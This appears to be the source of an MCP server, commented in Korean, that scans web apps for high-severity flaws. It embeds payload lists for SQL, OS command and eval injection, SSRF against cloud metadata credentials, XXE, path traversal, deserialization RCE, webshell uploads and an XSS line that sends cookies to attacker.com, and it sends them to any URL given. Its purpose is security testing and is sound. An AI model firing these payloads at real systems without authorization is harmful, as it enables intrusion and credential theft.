#!/usr/bin/env node
/**
 * React Security Scanner MCP Server
 *
 * KISA JavaScript 시큐어코딩 가이드 기반
 * 고위험(CVSS 7.0+) 취약점 스캐닝 MCP 서버
 *
 * 제공 도구:
 * - scan_vulnerability: 특정 취약점 테스트
 * - scan_all: 전체 취약점 스캔
 * - get_payloads: 취약점별 페이로드 조회
 * - generate_report: 보고서 생성
 * - send_report_email: 이메일 발송
 */

import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  ListResourcesRequestSchema,
  ReadResourceRequestSchema,
} from '@modelcontextprotocol/sdk/types.js';
import nodemailer from 'nodemailer';

// ============================================================
// 취약점 공격 모듈 (인라인)
// ============================================================

const VULNERABILITIES = {
  SQL_INJECTION: {
    name: 'SQL Injection',
    cwe: 'CWE-89',
    cvss: 9.8,
    severity: 'Critical',
    description: 'SQL 쿼리에 악의적인 코드를 삽입하여 데이터베이스를 조작하는 공격',
    payloads: {
      authBypass: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "') OR ('1'='1",
      ],
      unionBased: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
      ],
      timeBased: [
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
      ],
      errorBased: [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
      ],
    },
  },

  OS_COMMAND_INJECTION: {
    name: 'OS Command Injection',
    cwe: 'CWE-78',
    cvss: 9.8,
    severity: 'Critical',
    description: '운영체제 명령어를 삽입하여 서버에서 임의 명령을 실행하는 공격',
    payloads: {
      basic: [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(id)',
        '& dir',
      ],
      encoded: [
        '%3Bls',
        '%7Ccat%20/etc/passwd',
        '${IFS}ls',
      ],
      timeBased: [
        '; sleep 5',
        '| sleep 5',
        '$(sleep 5)',
      ],
    },
  },

  CODE_INJECTION: {
    name: 'Code Injection (eval)',
    cwe: 'CWE-94',
    cvss: 9.8,
    severity: 'Critical',
    description: 'eval() 등을 통해 서버에서 임의 코드를 실행하는 공격',
    payloads: {
      nodeJs: [
        'require("child_process").execSync("whoami").toString()',
        'process.mainModule.require("child_process").execSync("id")',
        'global.process.mainModule.require("fs").readFileSync("/etc/passwd")',
      ],
      functionConstructor: [
        'new Function("return process.env")()',
        '[].constructor.constructor("return process.env")()',
      ],
    },
  },

  XSS_ATTACK: {
    name: 'Cross-Site Scripting (XSS)',
    cwe: 'CWE-79',
    cvss: 7.1,
    severity: 'High',
    description: '악성 스크립트를 삽입하여 사용자 브라우저에서 실행시키는 공격',
    payloads: {
      reflected: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
      ],
      stored: [
        '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
      ],
      domBased: [
        'javascript:alert(document.cookie)',
        '#<script>alert(1)</script>',
      ],
      filterBypass: [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
      ],
    },
  },

  SSRF_ATTACK: {
    name: 'Server-Side Request Forgery (SSRF)',
    cwe: 'CWE-918',
    cvss: 9.1,
    severity: 'Critical',
    description: '서버가 내부 리소스나 외부 서비스에 요청하도록 조작하는 공격',
    payloads: {
      internalNetwork: [
        'http://127.0.0.1',
        'http://localhost:22',
        'http://192.168.1.1',
        'http://10.0.0.1',
      ],
      cloudMetadata: [
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      ],
      protocolHandlers: [
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/stats',
        'gopher://127.0.0.1:6379/_INFO',
      ],
    },
  },

  PATH_TRAVERSAL: {
    name: 'Path Traversal',
    cwe: 'CWE-22',
    cvss: 7.5,
    severity: 'High',
    description: '파일 경로를 조작하여 허용되지 않은 파일에 접근하는 공격',
    payloads: {
      basic: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//....//etc/passwd',
      ],
      encoded: [
        '..%2f..%2f..%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '%2e%2e%2f%2e%2e%2fetc/passwd',
      ],
      nullByte: [
        '../../../etc/passwd%00.jpg',
        '../../../etc/passwd\x00.png',
      ],
    },
  },

  DESERIALIZATION_ATTACK: {
    name: 'Insecure Deserialization',
    cwe: 'CWE-502',
    cvss: 9.8,
    severity: 'Critical',
    description: '신뢰할 수 없는 데이터의 역직렬화로 인한 원격 코드 실행 공격',
    payloads: {
      nodeSerialize: [
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}',
      ],
      prototypePollution: [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
      ],
    },
  },

  XXE_ATTACK: {
    name: 'XML External Entity (XXE)',
    cwe: 'CWE-611',
    cvss: 7.5,
    severity: 'High',
    description: 'XML 외부 엔티티를 통해 파일 읽기, SSRF 등을 수행하는 공격',
    payloads: {
      fileRead: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      ],
      ssrf: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
      ],
    },
  },

  CSRF_ATTACK: {
    name: 'Cross-Site Request Forgery (CSRF)',
    cwe: 'CWE-352',
    cvss: 8.0,
    severity: 'High',
    description: '사용자가 의도하지 않은 요청을 실행하도록 유도하는 공격',
    payloads: {
      formBased: [
        '<form action="TARGET" method="POST"><input name="amount" value="10000"/></form><script>document.forms[0].submit()</script>',
      ],
      imgBased: [
        '<img src="TARGET?action=delete&id=1" />',
      ],
    },
  },

  FILE_UPLOAD_ATTACK: {
    name: 'Unrestricted File Upload',
    cwe: 'CWE-434',
    cvss: 9.8,
    severity: 'Critical',
    description: '위험한 파일 업로드를 통해 웹쉘 등을 실행하는 공격',
    payloads: {
      webshellNames: [
        'shell.php',
        'shell.php.jpg',
        'shell.pHp',
        'shell.php5',
        '.htaccess',
      ],
      contentTypeBypass: [
        { filename: 'shell.php', contentType: 'image/jpeg' },
        { filename: 'shell.php', contentType: 'image/gif' },
      ],
    },
  },
};


// ============================================================
// 취약점 테스트 함수
// ============================================================

async function testVulnerability(vulnType, targetUrl, options = {}) {
  const vuln = VULNERABILITIES[vulnType];
  if (!vuln) {
    throw new Error(`Unknown vulnerability type: ${vulnType}`);
  }

  const results = [];
  const inputField = options.inputField || 'input';
  const method = options.method || 'GET';

  for (const [category, payloads] of Object.entries(vuln.payloads)) {
    const payloadList = Array.isArray(payloads) ? payloads : [payloads];

    for (const payload of payloadList.slice(0, options.maxPayloads || 3)) {
      const payloadStr = typeof payload === 'string' ? payload : JSON.stringify(payload);

      try {
        const startTime = Date.now();
        let response;

        if (method === 'GET') {
          response = await fetch(`${targetUrl}?${inputField}=${encodeURIComponent(payloadStr)}`, {
            signal: AbortSignal.timeout(options.timeout || 10000),
          });
        } else {
          response = await fetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ [inputField]: payloadStr }),
            signal: AbortSignal.timeout(options.timeout || 10000),
          });
        }

        const elapsed = Date.now() - startTime;
        const text = await response.text();

        // 취약점 판정 로직
        const vulnerable = detectVulnerability(vulnType, category, text, elapsed, response.status);

        results.push({
          category,
          payload: payloadStr.substring(0, 100),
          status: response.status,
          elapsed,
          vulnerable,
          evidence: vulnerable ? text.substring(0, 300) : null,
        });
      } catch (error) {
        results.push({
          category,
          payload: payloadStr.substring(0, 100),
          error: error.message,
          vulnerable: false,
        });
      }
    }
  }

  return {
    name: vuln.name,
    cwe: vuln.cwe,
    cvss: vuln.cvss,
    severity: vuln.severity,
    targetUrl,
    results,
    vulnerable: results.some(r => r.vulnerable),
    timestamp: new Date().toISOString(),
  };
}

function detectVulnerability(vulnType, category, responseText, elapsed, status) {
  const text = responseText.toLowerCase();

  switch (vulnType) {
    case 'SQL_INJECTION':
      return text.includes('sql') || text.includes('syntax') || text.includes('mysql') ||
             text.includes('postgresql') || text.includes('oracle') ||
             (category === 'timeBased' && elapsed > 4000) ||
             (category === 'authBypass' && (status === 200 || text.includes('welcome')));

    case 'OS_COMMAND_INJECTION':
      return text.includes('root:') || text.includes('uid=') || text.includes('bin/') ||
             text.includes('directory of') || text.includes('volume in drive') ||
             (category === 'timeBased' && elapsed > 4000);

    case 'CODE_INJECTION':
      return text.includes('uid=') || text.includes('path=') || text.includes('home=') ||
             text.includes('root:');

    case 'XSS_ATTACK':
      return responseText.includes('<script>') || responseText.includes('onerror=') ||
             responseText.includes('javascript:');

    case 'SSRF_ATTACK':
      return text.includes('root:') || text.includes('ami-') || text.includes('instance-id') ||
             text.includes('redis') || text.includes('ssh-');

    case 'PATH_TRAVERSAL':
      return text.includes('root:') || text.includes('[fonts]') || text.includes('[extensions]');

    case 'DESERIALIZATION_ATTACK':
      return text.includes('uid=') || text.includes('"isadmin":true');

    case 'XXE_ATTACK':
      return text.includes('root:') || text.includes('ami-') || text.includes('meta-data');

    case 'CSRF_ATTACK':
      return status === 200 && !text.includes('csrf') && !text.includes('token');

    case 'FILE_UPLOAD_ATTACK':
      return status === 200 && !text.includes('not allowed') && !text.includes('invalid');

    default:
      return false;
  }
}


// ============================================================
// 전체 스캔
// ============================================================

async function scanAll(targetBaseUrl, endpoints = {}, options = {}) {
  const defaultEndpoints = {
    SQL_INJECTION: '/api/login',
    OS_COMMAND_INJECTION: '/api/file',
    CODE_INJECTION: '/api/eval',
    XSS_ATTACK: '/search',
    SSRF_ATTACK: '/api/fetch',
    PATH_TRAVERSAL: '/api/download',
    DESERIALIZATION_ATTACK: '/api/data',
    XXE_ATTACK: '/api/xml',
    CSRF_ATTACK: '/api/transfer',
    FILE_UPLOAD_ATTACK: '/api/upload',
  };

  const mergedEndpoints = { ...defaultEndpoints, ...endpoints };
  const results = [];

  for (const [vulnType, endpoint] of Object.entries(mergedEndpoints)) {
    if (VULNERABILITIES[vulnType]) {
      const targetUrl = `${targetBaseUrl}${endpoint}`;
      try {
        const result = await testVulnerability(vulnType, targetUrl, options);
        results.push(result);
      } catch (error) {
        results.push({
          name: VULNERABILITIES[vulnType].name,
          cwe: VULNERABILITIES[vulnType].cwe,
          cvss: VULNERABILITIES[vulnType].cvss,
          error: error.message,
          vulnerable: false,
        });
      }
    }
  }

  return {
    targetBaseUrl,
    timestamp: new Date().toISOString(),
    summary: {
      total: results.length,
      vulnerable: results.filter(r => r.vulnerable).length,
      critical: results.filter(r => r.vulnerable && r.cvss >= 9.0).length,
      high: results.filter(r => r.vulnerable && r.cvss >= 7.0 && r.cvss < 9.0).length,
    },
    results,
  };
}


// ============================================================
// 보고서 생성
// ============================================================

function generateReport(scanResults, format = 'html') {
  const { targetBaseUrl, timestamp, summary, results } = scanResults;

  if (format === 'json') {
    return JSON.stringify(scanResults, null, 2);
  }

  if (format === 'text') {
    return `
========================================
보안 스캔 보고서
========================================
대상: ${targetBaseUrl}
시간: ${timestamp}

[요약]
- 전체 테스트: ${summary.total}개
- 취약점 발견: ${summary.vulnerable}개
- Critical: ${summary.critical}개
- High: ${summary.high}개

[상세 결과]
${results.map(r => `
${r.vulnerable ? '❌' : '✅'} ${r.name} (${r.cwe}) - CVSS ${r.cvss}
   상태: ${r.vulnerable ? '취약' : '안전'}
   ${r.error ? `에러: ${r.error}` : ''}
`).join('')}
========================================
`;
  }

  // HTML 보고서
  const vulnerableResults = results.filter(r => r.vulnerable);

  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>보안 스캔 보고서 - ${timestamp}</title>
  <style>
    body { font-family: -apple-system, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
    .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    h1 { border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }
    .summary { display: flex; gap: 15px; margin: 20px 0; }
    .stat { flex: 1; padding: 20px; border-radius: 8px; text-align: center; color: white; }
    .stat.critical { background: #e74c3c; }
    .stat.high { background: #e67e22; }
    .stat.safe { background: #27ae60; }
    .stat h3 { margin: 0; font-size: 32px; }
    .vuln { background: #fff5f5; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th { background: #34495e; color: white; padding: 12px; text-align: left; }
    td { padding: 12px; border-bottom: 1px solid #ddd; }
    .status-vuln { color: #e74c3c; font-weight: bold; }
    .status-safe { color: #27ae60; }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔒 보안 스캔 보고서</h1>
    <p><strong>대상:</strong> ${targetBaseUrl}</p>
    <p><strong>시간:</strong> ${timestamp}</p>

    <h2>📊 요약</h2>
    <div class="summary">
      <div class="stat critical"><h3>${summary.critical}</h3><p>Critical</p></div>
      <div class="stat high"><h3>${summary.high}</h3><p>High</p></div>
      <div class="stat safe"><h3>${summary.total - summary.vulnerable}</h3><p>Safe</p></div>
    </div>

    ${vulnerableResults.length > 0 ? `
    <h2>🚨 발견된 취약점</h2>
    ${vulnerableResults.map(v => `
    <div class="vuln">
      <strong>${v.name}</strong> (${v.cwe}) - CVSS ${v.cvss}
      <p>발견 케이스: ${v.results?.filter(r => r.vulnerable).length || 0}건</p>
    </div>
    `).join('')}
    ` : '<h2>✅ 취약점 없음</h2>'}

    <h2>📋 전체 결과</h2>
    <table>
      <tr><th>취약점</th><th>CWE</th><th>CVSS</th><th>상태</th></tr>
      ${results.map(r => `
      <tr>
        <td>${r.name}</td>
        <td>${r.cwe}</td>
        <td>${r.cvss}</td>
        <td class="${r.vulnerable ? 'status-vuln' : 'status-safe'}">
          ${r.vulnerable ? '❌ 취약' : '✅ 안전'}
        </td>
      </tr>
      `).join('')}
    </table>
  </div>
</body>
</html>
`;
}


// ============================================================
// 이메일 발송
// ============================================================

async function sendReportEmail(scanResults, emailConfig) {
  const { to, smtpHost, smtpPort, smtpUser, smtpPass } = emailConfig;

  if (!to || !smtpUser || !smtpPass) {
    throw new Error('이메일 설정이 불완전합니다: to, smtpUser, smtpPass 필요');
  }

  const transporter = nodemailer.createTransport({
    host: smtpHost || 'smtp.gmail.com',
    port: smtpPort || 587,
    secure: false,
    auth: { user: smtpUser, pass: smtpPass },
  });

  const vulnCount = scanResults.summary.vulnerable;
  const subject = vulnCount > 0
    ? `🚨 [보안경고] ${vulnCount}개 취약점 발견 - 보안 스캔 보고서`
    : `✅ [안전] 취약점 없음 - 보안 스캔 보고서`;

  const htmlReport = generateReport(scanResults, 'html');
  const jsonReport = generateReport(scanResults, 'json');

  const info = await transporter.sendMail({
    from: `Security Scanner <${smtpUser}>`,
    to,
    subject,
    html: htmlReport,
    attachments: [
      {
        filename: `security-report-${Date.now()}.json`,
        content: jsonReport,
        contentType: 'application/json',
      },
    ],
  });

  return {
    success: true,
    messageId: info.messageId,
    to,
    subject,
  };
}


// ============================================================
// MCP 서버 설정
// ============================================================

const server = new Server(
  {
    name: 'react-security-scanner',
    version: '1.0.0',
  },
  {
    capabilities: {
      tools: {},
      resources: {},
    },
  }
);


// ============================================================
// 도구 목록
// ============================================================

server.setRequestHandler(ListToolsRequestSchema, async () => {
  return {
    tools: [
      {
        name: 'scan_vulnerability',
        description: '특정 취약점 유형에 대해 대상 URL을 테스트합니다. KISA JavaScript 시큐어코딩 가이드 기반 CVSS 7.0+ 취약점을 테스트합니다.',
        inputSchema: {
          type: 'object',
          properties: {
            vulnerabilityType: {
              type: 'string',
              description: '테스트할 취약점 유형',
              enum: Object.keys(VULNERABILITIES),
            },
            targetUrl: {
              type: 'string',
              description: '테스트 대상 URL (예: https://example.com/api/login)',
            },
            inputField: {
              type: 'string',
              description: '입력 필드명 (기본값: input)',
              default: 'input',
            },
            method: {
              type: 'string',
              description: 'HTTP 메서드',
              enum: ['GET', 'POST'],
              default: 'GET',
            },
            maxPayloads: {
              type: 'number',
              description: '카테고리당 최대 페이로드 수',
              default: 3,
            },
          },
          required: ['vulnerabilityType', 'targetUrl'],
        },
      },
      {
        name: 'scan_all',
        description: '모든 고위험(CVSS 7.0+) 취약점에 대해 전체 스캔을 수행합니다.',
        inputSchema: {
          type: 'object',
          properties: {
            targetBaseUrl: {
              type: 'string',
              description: '대상 기본 URL (예: https://example.com)',
            },
            endpoints: {
              type: 'object',
              description: '취약점별 엔드포인트 매핑 (선택사항)',
              additionalProperties: { type: 'string' },
            },
          },
          required: ['targetBaseUrl'],
        },
      },
      {
        name: 'get_payloads',
        description: '특정 취약점 유형의 공격 페이로드 목록을 조회합니다.',
        inputSchema: {
          type: 'object',
          properties: {
            vulnerabilityType: {
              type: 'string',
              description: '취약점 유형',
              enum: Object.keys(VULNERABILITIES),
            },
            category: {
              type: 'string',
              description: '페이로드 카테고리 (선택사항)',
            },
          },
          required: ['vulnerabilityType'],
        },
      },
      {
        name: 'generate_report',
        description: '스캔 결과로부터 보고서를 생성합니다.',
        inputSchema: {
          type: 'object',
          properties: {
            scanResults: {
              type: 'object',
              description: 'scan_all 또는 scan_vulnerability의 결과',
            },
            format: {
              type: 'string',
              description: '보고서 형식',
              enum: ['html', 'json', 'text'],
              default: 'html',
            },
          },
          required: ['scanResults'],
        },
      },
      {
        name: 'send_report_email',
        description: '스캔 결과 보고서를 이메일로 발송합니다.',
        inputSchema: {
          type: 'object',
          properties: {
            scanResults: {
              type: 'object',
              description: 'scan_all의 결과',
            },
            to: {
              type: 'string',
              description: '수신자 이메일 주소',
            },
            smtpHost: {
              type: 'string',
              description: 'SMTP 서버 (기본: smtp.gmail.com)',
              default: 'smtp.gmail.com',
            },
            smtpPort: {
              type: 'number',
              description: 'SMTP 포트 (기본: 587)',
              default: 587,
            },
            smtpUser: {
              type: 'string',
              description: 'SMTP 사용자명',
            },
            smtpPass: {
              type: 'string',
              description: 'SMTP 비밀번호',
            },
          },
          required: ['scanResults', 'to', 'smtpUser', 'smtpPass'],
        },
      },
      {
        name: 'list_vulnerabilities',
        description: '지원하는 취약점 목록과 정보를 조회합니다.',
        inputSchema: {
          type: 'object',
          properties: {},
        },
      },
    ],
  };
});


// ============================================================
// 도구 실행
// ============================================================

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  try {
    switch (name) {
      case 'scan_vulnerability': {
        const result = await testVulnerability(
          args.vulnerabilityType,
          args.targetUrl,
          {
            inputField: args.inputField,
            method: args.method,
            maxPayloads: args.maxPayloads,
          }
        );
        return {
          content: [
            {
              type: 'text',
              text: JSON.stringify(result, null, 2),
            },
          ],
        };
      }

      case 'scan_all': {
        const result = await scanAll(
          args.targetBaseUrl,
          args.endpoints || {}
        );
        return {
          content: [
            {
              type: 'text',
              text: JSON.stringify(result, null, 2),
            },
          ],
        };
      }

      case 'get_payloads': {
        const vuln = VULNERABILITIES[args.vulnerabilityType];
        if (!vuln) {
          throw new Error(`Unknown vulnerability: ${args.vulnerabilityType}`);
        }

        let payloads = vuln.payloads;
        if (args.category && payloads[args.category]) {
          payloads = { [args.category]: payloads[args.category] };
        }

        return {
          content: [
            {
              type: 'text',
              text: JSON.stringify({
                name: vuln.name,
                cwe: vuln.cwe,
                cvss: vuln.cvss,
                description: vuln.description,
                payloads,
              }, null, 2),
            },
          ],
        };
      }

      case 'generate_report': {
        const report = generateReport(args.scanResults, args.format || 'html');
        return {
          content: [
            {
              type: 'text',
              text: report,
            },
          ],
        };
      }

      case 'send_report_email': {
        const result = await sendReportEmail(args.scanResults, {
          to: args.to,
          smtpHost: args.smtpHost,
          smtpPort: args.smtpPort,
          smtpUser: args.smtpUser,
          smtpPass: args.smtpPass,
        });
        return {
          content: [
            {
              type: 'text',
              text: JSON.stringify(result, null, 2),
            },
          ],
        };
      }

      case 'list_vulnerabilities': {
        const list = Object.entries(VULNERABILITIES).map(([key, vuln]) => ({
          key,
          name: vuln.name,
          cwe: vuln.cwe,
          cvss: vuln.cvss,
          severity: vuln.severity,
          description: vuln.description,
          categories: Object.keys(vuln.payloads),
        }));
        return {
          content: [
            {
              type: 'text',
              text: JSON.stringify(list, null, 2),
            },
          ],
        };
      }

      default:
        throw new Error(`Unknown tool: ${name}`);
    }
  } catch (error) {
    return {
      content: [
        {
          type: 'text',
          text: `Error: ${error.message}`,
        },
      ],
      isError: true,
    };
  }
});


// ============================================================
// 리소스 (취약점 정보)
// ============================================================

server.setRequestHandler(ListResourcesRequestSchema, async () => {
  return {
    resources: Object.entries(VULNERABILITIES).map(([key, vuln]) => ({
      uri: `security://vulnerability/${key}`,
      name: vuln.name,
      description: `${vuln.cwe} - CVSS ${vuln.cvss} - ${vuln.description}`,
      mimeType: 'application/json',
    })),
  };
});

server.setRequestHandler(ReadResourceRequestSchema, async (request) => {
  const uri = request.params.uri;
  const match = uri.match(/^security:\/\/vulnerability\/(.+)$/);

  if (match) {
    const vulnKey = match[1];
    const vuln = VULNERABILITIES[vulnKey];

    if (vuln) {
      return {
        contents: [
          {
            uri,
            mimeType: 'application/json',
            text: JSON.stringify({
              key: vulnKey,
              ...vuln,
            }, null, 2),
          },
        ],
      };
    }
  }

  throw new Error(`Resource not found: ${uri}`);
});


// ============================================================
// 서버 시작
// ============================================================

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error('React Security Scanner MCP Server running on stdio');
}

main().catch(console.error);
